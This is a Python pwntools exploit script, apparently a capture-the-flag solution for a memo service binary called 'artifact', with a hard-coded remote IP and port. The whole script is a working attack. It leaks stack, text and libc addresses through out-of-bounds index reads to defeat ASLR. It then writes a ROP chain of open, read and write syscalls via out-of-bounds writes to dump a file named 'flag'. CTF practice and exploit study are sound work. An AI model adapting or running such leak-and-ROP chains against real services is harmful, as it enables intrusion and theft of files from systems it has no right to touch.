#!/usr/bin/env python
from pwn import *

def show(index):
    s.sendlineafter('Choice?\n','1')
    s.sendlineafter('Idx?\n',str(index))
    s.recvuntil('Here it is: ')
    return int(s.recvline())

def memo(index,number):
    s.sendlineafter('Choice?\n','2')
    s.sendlineafter('Idx?\n',str(index))
    s.sendlineafter('Give me your number:\n',str(number))

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process(['./artifact'], env = {'LD_PRELOAD': './libc.so.6'})
    else:
        s = remote('52.192.178.153',31337)

    memo_addr = show(200) - 0x730
    print '[*] memo address: %#x' % memo_addr
    text_base = show(202) - 0xbb0
    print '[*] text base: %#x' % text_base
    libc_base = show(203) - 0x203f1
    print '[*] libc base: %#x' % libc_base

    pop_rax = libc_base + 0x3a997
    pop_rdi = libc_base + 0x1fd7a
    pop_rsi = libc_base + 0x1fcbd
    pop_rdx = libc_base + 0x1b92
    syscall = libc_base + 0xbc765

    payload = ''
    # open("flag",0,2)
    payload += p64(pop_rax) + p64(2)
    payload += p64(pop_rdi) + p64(memo_addr + 0x800)
    payload += p64(pop_rsi) + p64(0)
    payload += p64(pop_rdx) + p64(2)
    payload += p64(syscall)

    # read(3,buf,0x100)
    payload += p64(pop_rax) + p64(0)
    payload += p64(pop_rdi) + p64(3)
    payload += p64(pop_rsi) + p64(memo_addr + 0x800)
    payload += p64(pop_rdx) + p64(0x100)
    payload += p64(syscall)

    # write(1,buf,0x100)
    payload += p64(pop_rax) + p64(1)
    payload += p64(pop_rdi) + p64(1)
    payload += p64(pop_rsi) + p64(memo_addr + 0x800)
    payload += p64(pop_rdx) + p64(0x100)
    payload += p64(syscall)

    for i in range(0,len(payload),8):
        memo(203 + i // 8, u64(payload[i:i+8]))
    memo(0x100, u64("flag".ljust(8,'\0')))

    s.sendline('3')
    s.stream()
